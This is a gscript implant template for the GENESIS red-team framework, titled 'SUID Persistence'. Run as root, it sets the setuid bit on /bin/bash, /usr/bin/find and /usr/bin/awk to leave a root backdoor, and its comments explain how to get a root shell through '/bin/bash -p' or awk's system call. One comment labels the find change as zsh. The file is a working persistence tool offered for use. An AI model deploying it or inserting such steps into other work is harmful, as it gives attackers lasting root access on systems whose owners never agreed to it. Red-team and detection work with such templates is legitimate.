// Example gscript template
// Title: SUID Persistence
// Author: ahhh
// Purpose: sets the sticky bit on bash as root, for easy future priv esc
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1166
// Note: must run implant as root, later need to invoke "/bin/bash -p" to use SUID backdoor

//priority:100
//timeout:150

function BeforeDeploy() {
  LogInfo("starting execution of SUID Persistence");
  var well = GetUser();
  LogInfo("Our user is: "+well.username);
  if (well.username == "root") {
    return true;
  } else {
    LogInfo("Detected a non-root user, this needs to run as root!");
    Halt();
    return false;
  }
  return true;
}

function Deploy() {
  // setting /bin/bash to U+S
  ForkExecuteCommand("chmod", ["u+s", "/bin/bash"]);
  ForkExecuteCommand("chmod", ["u+x", "/bin/bash"]);
  LogInfo("Set /bin/bash");

  // setting /bin/zsh to U+S
  ForkExecuteCommand("chmod", ["u+s", "/usr/bin/find"]);
  ForkExecuteCommand("chmod", ["u+x", "/usr/bin/find"]);
  LogInfo("Set /bin/zsh");

  // setting awk
  // USAGE: awk '{ system("/bin/sh") }'
  ForkExecuteCommand("chmod", ["u+s", "/usr/bin/awk"]);
  ForkExecuteCommand("chmod", ["u+x", "/usr/bin/awk"]);
  LogInfo("Set /usr/bin/awk");

  return true;
}

function AfterDeploy() {
  LogInfo("done SUID Persistence");
  return true;
}
